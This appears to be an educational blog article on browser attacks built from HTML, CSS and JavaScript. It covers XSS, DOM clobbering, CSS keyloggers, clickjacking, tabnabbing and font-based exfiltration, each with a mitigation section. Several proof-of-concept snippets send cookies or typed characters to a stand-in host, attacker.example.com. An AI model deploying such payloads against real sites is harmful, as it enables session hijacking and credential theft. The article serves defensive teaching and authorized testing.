The Cursed Trinity: Attacks With Only HTML, CSS, and JavaScript

When most people think of "hacking," they imagine compiled binaries, buffer overflows, and meterpreter shells. But some of the most insidious attacks in the browser require nothing more than web standards — no plugins, no ActiveX, no Java applets. Just HTML, CSS, and vanilla JavaScript.

1. Stored & Reflected Cross-Site Scripting (XSS)

What it is: An attacker injects executable scripts into a web page that other users view.

  • Reflected XSS: The payload lives in a request parameter (a search query, an error message, a redirect URL) that the server echoes back into the page without sanitization.
  • Stored XSS: The payload is persisted on the server — in a comment, a forum post, a profile field — and served to every visitor.

Proof of Concept:

Code Example:

<!-- If the server reflects ?name= unsanitized -->
<input type="text" id="name" value="<script>fetch('https://attacker.example.com/steal?c='+document.cookie)</script>">

What a pentester proves: Cookie theft, session hijacking, keylogging, phishing overlays, internal network scanning via fetch(), and full DOM manipulation — all without a single server-side bug beyond the missing encoding filter.

How to prevent it:

  • Output encoding: Encode user-supplied data before rendering. Use context-appropriate encoding — HTML entity encode for HTML body, JavaScript encode for script contexts, URL encode for URL parameters. Libraries like OWASP Java Encoder or DOMPurify handle this reliably.
  • Content Security Policy (CSP): Set a strict CSP header such as default-src 'self'; script-src 'self'. This stops inline scripts and external script loads even if an injection occurs.
  • HttpOnly cookies: Set the HttpOnly flag on session cookies so they cannot be read by document.cookie.
  • Input validation: Validate and reject unexpected input server-side before it reaches any reflection or storage point.

2. DOM Clobbering

What it is: An attacker uses HTML element id and name attributes to override global JavaScript variables and corrupt the page's logic.

How it works: HTML elements with id attributes become properties on the window object. If the page's JavaScript does if (window.someConfig) { ... }, an attacker can inject:

Code Example:

<a id="someConfig" href="javascript:alert('owned')">hidden</a>

The <a> element's href becomes someConfig.toString() — which returns the full URL, including javascript: protocol, if the code uses the value in a dangerous sink like innerHTML or a script loader.

What a pentester proves: Bypassing sanitizers that strip <script> tags but leave <a>, <form>, <img>, or <iframe> intact. DOM clobbering is often used in advanced XSS chains against frameworks (jQuery, Google's Closure Library, even some React patterns).

How to prevent it:

  • Validate before use: Instead of checking if (window.someConfig), use if (typeof someConfig === 'object' && someConfig !== null) or check with Object.prototype.hasOwnProperty and a type guard.
  • Avoid direct window property lookups: Store configuration in a closed scope or a frozen object rather than relying on global window properties.
  • Sanitize HTML inputs: Strip id and name attributes from user-supplied HTML when possible, or use a strict allowlist.

3. CSS Keylogger

What it is: A CSS-only attack that exfiltrates data through attribute selectors and background-image URLs.

How it works: CSS attribute selectors can match partial text content of <input> values:

Code Example:

input[value^="a"] { background: url(https://attacker.example.com/log?a); }
input[value^="b"] { background: url(https://attacker.example.com/log?b); }
/* ... repeat for every character, every position */

When a user types into the input, the value attribute changes, the CSS rule matches, and the browser makes a request to the attacker's server — leaking one character at a time.

Limitations: The value attribute only updates on form submission or programmatic setAttribute() — not on every keystroke. However, in login forms that pre-fill from a password manager, or when combined with JavaScript that sets the value attribute on each input event, this becomes functional.

What a pentester proves: Exfiltration of CSRF tokens, detection of visited links (via :visited selector leaks, though modern browsers limit this), and "scroll jacking" through scroll-based CSS animations that make requests.

How to prevent it:

  • Strict CSP: Use style-src 'nonce-...' or style-src 'sha256-...' to block inline <style> tags entirely.
  • Never allow user content in <style> elements: User-supplied data should never be rendered inside a <style> tag or a style attribute without rigorous sanitization.
  • Input validation: Reject or escape CSS-relevant characters ({, }, :, ;, url() in user input that will be rendered near style contexts.

4. Clickjacking (UI Redressing)

What it is: An attacker tricks a user into clicking something they can't see — a "like" button, a transfer confirmation, or a permission grant — by overlaying the target page as a transparent <iframe> over a decoy UI.

How it works (HTML + CSS only):

Code Example:

<style>
  iframe {
    position: absolute;
    top: 0; left: 0;
    width: 500px; height: 500px;
    opacity: 0.001;
    z-index: 10;
  }
  .deco-button {
    position: absolute;
    top: 200px; left: 100px;
    z-index: 1;
  }
</style>
<div class="deco-button">Click here for a free cat!</div>
<iframe src="https://target.example.com/transfer?amount=1000"></iframe>

The user thinks they're clicking the decoy. The click goes through the transparent iframe into the target page. With careful pixel positioning, a single click on "Pay Now" or "Authorize" can be precisely aligned with the target's button.

What a pentester proves: Any sensitive action (OAuth authorization, bank transfer, admin panel actions) can be triggered without the user's knowledge. The attacker doesn't even need JavaScript — this works with pure HTML + CSS.

How to prevent it:

  • X-Frame-Options header: Set X-Frame-Options: DENY or X-Frame-Options: SAMEORIGIN to prevent your site from being loaded in iframes on other domains.
  • CSP frame-ancestors: Use Content-Security-Policy: frame-ancestors 'none' or 'self' for more granular control.

5. Tabnabbing (Reverse Tabnabbing)

What it is: An attacker exploits the target="_blank" link behavior to change the parent page after the user navigates away.

How it works:

Code Example:

<a href="https://attacker.example.com/evil" target="_blank">Check this out!</a>

When the link lacks rel="noopener noreferrer", the opened page can use window.opener.location = 'https://phish.example.com/login' to replace the original tab with a phishing page. When the user returns to the original tab (now a fake login screen), they re-enter credentials.

What a pentester proves: Any external link on a site that uses target="_blank" without rel="noopener noreferrer" can be weaponized if the attacker controls the linked page.

How to prevent it:

  • Always add rel="noopener noreferrer" to every target="_blank" link.
  • Modern browsers default target="_blank" to noopener behavior, but never rely on this — always be explicit.

6. CSS Exfiltration via @font-face / Unicode Range

What it is: Using CSS font-loading side channels to exfiltrate page content character by character.

How it works: If an attacker can inject CSS into a page (e.g., a <style> tag via a comment form), they can define custom @font-face rules that match specific text content via unicode-range:

Code Example:

@font-face {
  font-family: "leak";
  src: url(https://attacker.example.com/leak?c=A);
  unicode-range: U+0041;
}
body { font-family: "leak", ...; }

If the page body contains the letter 'A', the browser loads the font from the attacker's server. An entire page's character set can be leaked, one request at a time.

What a pentester proves: Exfiltration of visible text content — including CSRF tokens, usernames, and other sensitive data rendered in the DOM — using only CSS, with no JavaScript required.

How to prevent it:

  • Block user-supplied <style> tags with a strict CSP (style-src 'nonce-...').
  • If user-controlled styles are necessary, sanitize @font-face rules and unicode-range declarations specifically.

7. Browser History Leak via :visited

What it is: An attacker detects which links a user has visited using CSS selectors.

How it works (mostly neutered in modern browsers):

Code Example (legacy):

a:visited { background: url(https://attacker.example.com/leak?url=https://admin.internal.com); }

Current state: Modern browsers (Chrome 82+, Firefox 68+, Safari 13.1+) severely restrict what CSS properties :visited can change — only color, background-color, border-color, outline-color, and column-rule-color — and these are not recomputed for getComputedStyle(). Timing-based attacks measuring paint time differences remain theoretically possible in edge cases.

How to prevent it:

  • Keep browsers up to date — modern versions already mitigate this.
  • Use private browsing mode for sensitive browsing to prevent history-based profiling.

Putting It All Together: A Realistic Test Scenario

During an authorized assessment, a pentester might chain several of these:

  • Find a stored XSS that bypasses <script> filters but allows <style> tags (DOM clobbering or CSS injection).
  • Inject a CSS keylogger on a login form to capture the first few characters of a password.
  • Use DOM clobbering to redirect a JSONP callback or config object, triggering a more traditional XSS.
  • Deliver a clickjacking overlay to trick an admin into approving a malicious OAuth app.

Final Thoughts

HTML, CSS, and JavaScript aren't just for building websites — they're a full-fledged attack surface. The next time you see a "simple" comment form or a "just styling" CSS injection, remember: the trinity of web markup is more powerful than most developers give it credit for.

The defense mindset is everything. Every CSS injection that goes unfixed, every missing rel="noopener", every missing CSP header — these are opportunities for attackers and findings for pentesters.

As an authorized tester, understanding these techniques means you can find and fix them before a real attacker does. Awareness, proper headers, output encoding, and Content Security Policy are your strongest weapons.

Stay sharp. Test responsibly. Patch thoroughly.
